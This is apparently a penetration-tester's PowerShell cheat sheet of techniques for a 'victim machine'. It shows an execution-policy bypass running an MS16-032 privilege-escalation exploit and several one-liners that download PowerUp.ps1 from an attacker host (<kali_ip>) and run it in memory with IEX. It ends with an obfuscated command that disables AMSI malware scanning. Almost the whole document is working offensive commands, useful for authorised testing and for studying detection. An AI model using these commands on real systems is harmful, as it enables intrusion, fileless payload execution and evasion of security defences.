# Powershell

Here I will describe many common tricks for Powershell:

## Execute Exploit oneliner

If you already downloaded the powershell scrip to your victim machine, execute as following:

```
C:\tmp>powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
```

## Non Interactive PowerShell execution

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

## Execute file in memory

Let's say you would like to execute PS module from you Apache / SimpleHTTPServer on the victim. 
The following techniques will download the PS module and execute it in memory with no touching the disk.

For Powershell 1.0 - 2.0:

```
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/PowerUp.ps1')
```

For Powershell 3.0+:

```
PS C:\> iex (iwr 'http://<kali_ip>/PowerUp.ps1')
```

## Execute Script without Webclient

In some case WebClient might be blocked so try another way:

```
PS C:\> $wr = [System.NET.WebRequest]::Create("http://<kali_ip>/PowerUp.ps1") 
PS C:\> $r = $wr.GetResponse()
PS C:\> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

## Disable AMSI protection in Win10+

This features uses string detection to detect "malicous" intents in commands and scripts. This is applied into Windows 10 and above:

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
